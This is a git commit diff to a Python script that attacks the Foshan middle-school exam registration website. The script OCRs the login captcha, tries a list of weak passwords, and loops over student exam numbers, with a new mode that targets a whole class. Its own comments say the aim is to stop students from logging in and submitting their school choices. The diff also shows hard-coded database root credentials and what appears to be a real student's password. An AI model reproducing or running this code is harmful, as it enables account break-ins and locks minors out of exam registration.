64674aeffdceb246b23a554c5ca9a111f9a57023
AdminWhaleFall <2734184475@qq.com>
2021-05-22 16:05:08 +0800

    🌈 style: 小更改。

--- zkEdu.py
+++ zkEdu.py
@@ -27,7 +27,7 @@ import requests
 from lxml import etree
 from PIL import Image
 import traceback
-import pymysql
+# import pymysql
 
 
 class Encrypt:
@@ -35,7 +35,9 @@ class Encrypt:
 
         # 加密的js文件
 
-        with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), "EncryptJS.js"), mode="r") as js:
+        with open(os.path.join(os.path.abspath(os.path.dirname(__file__)),
+                               "EncryptJS.js"),
+                  mode="r") as js:
             jsContent = js.read()
 
         self.ctx = execjs.compile(jsContent)
@@ -51,13 +53,16 @@ class Encrypt:
 
 # 从这里开始
 
+
 class Zkweb:
 
     # 初始化各种属性
     def __init__(self):
         self.header = {
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 MicroMessenger/6.7.3(0x16070321) NetType/WIFI Language/zh_CN",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            "User-Agent":
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 MicroMessenger/6.7.3(0x16070321) NetType/WIFI Language/zh_CN",
+            "Accept":
+            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
             "Accept-Encoding": "gzip, deflate, br",
             "Accept-Language": "zh-CN,zh;q=0.9",
             "Cache-Control": "no-cache",
@@ -86,13 +91,25 @@ class Zkweb:
             # print(resp.text)
             html = etree.HTML(resp.text)
             code = html.xpath(
-                "/html/body/form/table/tr/td[2]/table/tr[4]/td/table/tr/td/table/tr[3]/td[2]/img/@src")[0]
-            code_url = "https://exam.edu.foshan.gov.cn/iexamfs/"+code
+                "/html/body/form/table/tr/td[2]/table/tr[4]/td/table/tr/td/table/tr[3]/td[2]/img/@src"
+            )[0]
+            code_url = "https://exam.edu.foshan.gov.cn/iexamfs/" + code
             # print("验证码地址:", code_url)
             return code_url
         except Exception as e:
-            print("页面验证码获取失败")
+
+            print("页面验证码获取失败 原因:")
+
+            try:
+                if "系统例行维护" in resp.text:
+                    print("中考报名系统晚上22:30至次日08:30暂停服务!")
+                    sys.exit()
+            except Exception as er:
+                print("错误信息:%s" % (er))
+                time.sleep(5)
+
             return None
+
         finally:
             resp.close()
 
@@ -119,12 +136,7 @@ class Zkweb:
 
     def checkCode(self):
         if self.downloadCode():
-            # 两种验证码图片处理方法
-
-            # image = self.delete_spot()
-            # image = self.convert_Image()
             image = self.dispose_code()  # 效果最好的方案
-
             code = pytesseract.image_to_string(image)
             # 去掉非法字符，只保留字母数字
             textCode = re.sub("\W", "", code)
@@ -139,86 +151,8 @@ class Zkweb:
         else:
             return False
 
-    # 美化验证码1
-    def convert_Image(self, standard=127.5):
-        '''
-        【灰度转换】
-        '''
-
-        img = Image.open(BytesIO(self.code))
-
-        image = img.convert('L')
-
-        '''
-        【二值化】
-        根据阈值 standard , 将所有像素都置为 0(黑色) 或 255(白色), 便于接下来的分割
-        '''
-        pixels = image.load()
-        for x in range(image.width):
-            for y in range(image.height):
-                if pixels[x, y] > standard:
-                    pixels[x, y] = 255
-                else:
-                    pixels[x, y] = 0
-
-        # image.show()
-        return image
-
-    # 美化验证码2
-
-    def delete_spot(self):
-
-        def processing_image():
-
-            # 2进制处理
-            img = Image.open(BytesIO(self.code))
-
-            img = img.convert("L")  # 转灰度
-            pixdata = img.load()
-            w, h = img.size
-            threshold = 160  # 该阈值不适合所有验证码，具体阈值请根据验证码情况设置
-            # 遍历所有像素，大于阈值的为黑色
-            for y in range(h):
-                for x in range(w):
-                    if pixdata[x, y] < threshold:
-                        pixdata[x, y] = 0
-                    else:
-                        pixdata[x, y] = 255
-            return img
-
-        images = processing_image()
-
-        data = images.getdata()
-
-        w, h = images.size
-        black_point = 0
-        for x in range(1, w - 1):
-            for y in range(1, h - 1):
-                mid_pixel = data[w * y + x]  # 中央像素点像素值
-                if mid_pixel < 50:  # 找出上下左右四个方向像素点像素值
-                    top_pixel = data[w * (y - 1) + x]
-                    left_pixel = data[w * y + (x - 1)]
-                    down_pixel = data[w * (y + 1) + x]
-                    right_pixel = data[w * y + (x + 1)]
-                # 判断上下左右的黑色像素点总个数
-                    if top_pixel < 10:
-                        black_point += 1
-                    if left_pixel < 10:
-                        black_point += 1
-                    if down_pixel < 10:
-                        black_point += 1
-                    if right_pixel < 10:
-                        black_point += 1
-                    if black_point < 1:
-                        images.putpixel((x, y), 255)
-                        black_point = 0
-
-        # images.show()
-        return images
-
     # 美化验证码3 个人感觉效果最好的方案了
     def dispose_code(self):
-
         img = Image.open(BytesIO(self.code))
 
         def binarizing(img, threshold):
@@ -239,24 +173,24 @@ class Zkweb:
         """传入二值化后的图片进行降噪"""
         pixdata = img.load()
         w, h = img.size
-        for y in range(1, h-1):
-            for x in range(1, w-1):
+        for y in range(1, h - 1):
+            for x in range(1, w - 1):
                 count = 0
-                if pixdata[x, y-1] > 245:  # 上
+                if pixdata[x, y - 1] > 245:  # 上
                     count = count + 1
-                if pixdata[x, y+1] > 245:  # 下
+                if pixdata[x, y + 1] > 245:  # 下
                     count = count + 1
-                if pixdata[x-1, y] > 245:  # 左
+                if pixdata[x - 1, y] > 245:  # 左
                     count = count + 1
-                if pixdata[x+1, y] > 245:  # 右
+                if pixdata[x + 1, y] > 245:  # 右
                     count = count + 1
-                if pixdata[x-1, y-1] > 245:  # 左上
+                if pixdata[x - 1, y - 1] > 245:  # 左上
                     count = count + 1
-                if pixdata[x-1, y+1] > 245:  # 左下
+                if pixdata[x - 1, y + 1] > 245:  # 左下
                     count = count + 1
-                if pixdata[x+1, y-1] > 245:  # 右上
+                if pixdata[x + 1, y - 1] > 245:  # 右上
                     count = count + 1
-                if pixdata[x+1, y+1] > 245:  # 右下
+                if pixdata[x + 1, y + 1] > 245:  # 右下
                     count = count + 1
                 if count > 4:
                     pixdata[x, y] = 255
@@ -326,7 +260,12 @@ class Zkweb:
 
             except:
                 print("获取主页链接失败", resp.text)
-                with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), "error//%s %s.html" % (userid, time.strftime("%H-%M-%S", time.localtime()))), mode="w", encoding="gb2312") as f:
+                with open(os.path.join(
+                        os.path.abspath(os.path.dirname(__file__)),
+                        "error//%s %s.html" %
+                    (userid, time.strftime("%H-%M-%S", time.localtime()))),
+                          mode="w",
+                          encoding="gb2312") as f:
 
                     f.write(resp.text)
 
@@ -337,7 +276,8 @@ class Zkweb:
     # 保存并解析 主页
     def index(self):
 
-        self.header["Referer"] = "https://exam.edu.foshan.gov.cn/iexamfs/KsLoginSuccessAction.action"
+        self.header[
+            "Referer"] = "https://exam.edu.foshan.gov.cn/iexamfs/KsLoginSuccessAction.action"
 
         index_url = "https://exam.edu.foshan.gov.cn/iexamfs/%s" % (
             self.index_url)
@@ -348,19 +288,27 @@ class Zkweb:
         index_return = self.__indexRE(resp.text)
         if index_return[0]:
             # 下载
-            with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), "html//%s.html" % (index_return[1])), mode="w", encoding="utf8") as f:
+            with open(os.path.join(os.path.abspath(os.path.dirname(__file__)),
+                                   "html//%s.html" % (index_return[1])),
+                      mode="w",
+                      encoding="utf8") as f:
 
                 f.write(resp.text)
 
             print("主页:%s 下载成功!" % (index_return[1]))
 
         else:
-            with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), "html//%s.html" % ("Error解析错误{}".format(random.randint(1,9999)))), mode="w", encoding="utf8") as f:
+            with open(os.path.join(
+                    os.path.abspath(os.path.dirname(__file__)),
+                    "html//%s.html" %
+                ("Error解析错误{}".format(random.randint(1, 9999)))),
+                      mode="w",
+                      encoding="utf8") as f:
 
                 f.write(resp.text)
 
             print("主页解析错误 但已下载 主页:%s 下载成功!" % ("Error解析错误"))
-            
+
     # 解析主页 内部方法
 
     def __indexRE(self, html):
@@ -377,37 +325,40 @@ class Zkweb:
             st_id = html.xpath(
                 "/html/body/div[1]/table[1]/tr[3]/td[2]")[0].text.strip()  # 考号
 
-            print("[Suc]HTML解析成功! 姓名:%(st_name)s 班级:%(st_class)s 考号:%(st_id)s" % vars())
+            print(
+                "[Suc]HTML解析成功! 姓名:%(st_name)s 班级:%(st_class)s 考号:%(st_id)s" %
+                vars())
 
-            return (True, "%(st_name)s%(st_class)s%(st_id)s" % vars(),)
+            return (
+                True,
+                "%(st_name)s%(st_class)s%(st_id)s" % vars(),
+            )
         except Exception as e:
             print("[Error]HTML解析失败!", e)
-            return (False,)
+            return (False, )
 
 
 # mysql
 # INSERT INTO users (id,time) VALUES (123,'test');
-def writeMsq(id, time):
+# def writeMsq(id, time):
+#     try:
+#         # 打开数据库连接
+#         conn = pymysql.connect(host="192.168.101.4",
+#                                user="root",
+#                                passwd="123456",
+#                                port=3306,
+#                                database="fszk")
+#         # 获取游标
+#         cursor = conn.cursor()
+#         sql1 = "INSERT INTO users (id,time) VALUES (%s,%s)"
+#         cursor.execute(sql1, (id, time))
+#         # 一定要提交更改
+#         cursor.connection.commit()
+#     except Exception as u:
+#         print("数据库写入失败!", u)
 
-    try:
-        # 打开数据库连接
-        conn = pymysql.connect(
-            host="192.168.101.4", user="root", passwd="123456", port=3306, database="fszk")
-        # 获取游标
-        cursor = conn.cursor()
-        sql1 = "INSERT INTO users (id,time) VALUES (%s,%s)"
-        cursor.execute(sql1, (id, time))
-        # 一定要提交更改
-        cursor.connection.commit()
-    except Exception as u:
-        print("数据库写入失败!", u)
-
-# writeMsq(111,"Ss")
-# sys.exit()
 
 # 获取配置文件
-
-
 def getConfig():
     config = configparser.ConfigParser()
     path_py = os.path.split(os.path.realpath(sys.argv[0]))[0]
@@ -428,8 +379,7 @@ def getConfig():
     UserList(用户列表):%s
     checkTime(检查时间):%s
     ################################################
-            ''' % (UserList, checkTime)
-              )
+            ''' % (UserList, checkTime))
 
     else:
         config.add_section("common")
@@ -453,8 +403,10 @@ def main(userid, pwd=None, _status=0):
 
     try:
         i = 0  # 单用户请求次数计数
-        PwdList = ["@a123456", "@abc123456", "@Aa123456",
-                   "@abc666666", "@qq123456", "@Aa66666"]  # 弱密码列表
+        PwdList = [
+            "@a123456", "@abc123456", "@Aa123456", "@abc666666", "@qq123456",
+            "@Aa66666"
+        ]  # 弱密码列表
 
         while True:
             i += 1
@@ -544,41 +496,50 @@ if __name__ == "__main__":
     # 2. checkTime检查时间
     # 3. 本程序只用于恶搞,使她登不上报名账号提交不了志愿。
     ################################################
-            '''
-          )
+            ''')
+    try:
+        UserList, checkTime = getConfig()
+    except Exception as e:
+        print("[Config]配置文件有误!请检查后重试", traceback.format_exc())
+        sys.exit()
 
-    # time.sleep(2)
+    result = input("运行模式选择:(默认/1.根据配置运行/2.全班禁止登录模式)")
+    if str(result) == "2":
+        classID = input(">输入班级id:")
+        i = 0
+        # 不间断循环
+        while True:
+            i += 1
+            for userID in range(1, 52):
+                # print("2106051508%s%02d" % (classID,userID))
+                result = main("2106051508%s%02d" % (classID, userID))
+                if result == "Suc":
+                    # print("用户(%s)限制成功!")
+                    pass
 
-    # try:
-    #     UserList, checkTime = getConfig()
-    # except Exception as e:
-    #     print("[Config]配置文件有误!请检查后重试", traceback.format_exc())
-    #     sys.exit()
+            # 获取配置文件 间接实现热重载
+            UserList, checkTime = getConfig()
+            print("班级(%s)遍历模式！第%s次" % (classID, i))
+            time.sleep(checkTime)
 
-    # i = 0
-    # # 不间断循环
-    # while True:
-
-    #     # print("----------------------第%s次循环遍历!----------------------------" % (i))
-
-    #     for userID in UserList:
-    #         result = main("2106051508%04d" % (userID), "@A123456")
-
-    #         if result == "Suc":
-    #             # 成功就删除账号
-    #             UserList.remove(userID)
-    #             print(userID, "已删除!")
-    #             print("剩余用户:%s" % (UserList))
-
-    #     if UserList == []:
-    #         i += 1
-    #         print("--------------第%s次循环遍历!已完成歇息中----------" % (i))
-
-    #         # 间接实现热重载
-
-    #         UserList, checkTime = getConfig()
-
-    #         time.sleep(checkTime)
+    else:
+        # 根据配置文件针对某个人
+        i = 0
+        # 不间断循环
+        while True:
+            for userID in UserList:
+                result = main("2106051508%04d" % (userID))
+                if result == "Suc":
+                    # 成功就删除账号
+                    UserList.remove(userID)
+                    print(userID, "已删除!")
+                    print("剩余用户:%s" % (UserList))
+            if UserList == []:
+                i += 1
+                print("--------------第%s次循环遍历!已完成歇息中----------" % (i))
+                # 获取配置文件 间接实现热重载
+                UserList, checkTime = getConfig()
+                time.sleep(checkTime)
 
     # 报废代码
     # 构造考号:2106051508|0613
@@ -595,25 +556,24 @@ if __name__ == "__main__":
     # main(userid,pwd)
 
     # 多进程部分
-    import multiprocessing
-    pool = multiprocessing.Pool(processes=5)
+    # import multiprocessing
+    # pool = multiprocessing.Pool(processes=5)
 
-    # 通过遍历得到全校考号
+    # # 通过遍历得到全校考号
 
-    while True:
-        for classId in range(1, 12):
-            for i in range(1, 52):
+    # while True:
+    #     for classId in range(1, 12):
+    #         for i in range(1, 52):
 
-                # 女朋友的班级学号 不要搞她
-                if i == 13 and classId == 6:
-                    pool.apply_async(func=main, args=(
-                        "2106051508%02d%02d" % (classId, i), "@lovehyy123456",))
+    #             # 女朋友的班级学号 不要搞她
+    #             if i == 13 and classId == 6:
+    #                 pool.apply_async(func=main,
+    #                                  args=(
+    #                                      "2106051508%02d%02d" % (classId, i),
+    #                                      "@lovehyy123456",
+    #                                  ))
 
-                pool.apply_async(func=main, args=(
-                    "2106051508%02d%02d" % (classId, i),))
+    #             pool.apply_async(func=main,
+    #                              args=("2106051508%02d%02d" % (classId, i), ))
 
-                # main("2106051508%02d%02d" % (classId, i), "@A123456")
-
-        
-        
-        
+    # main("2106051508%02d%02d" % (classId, i), "@A123456")
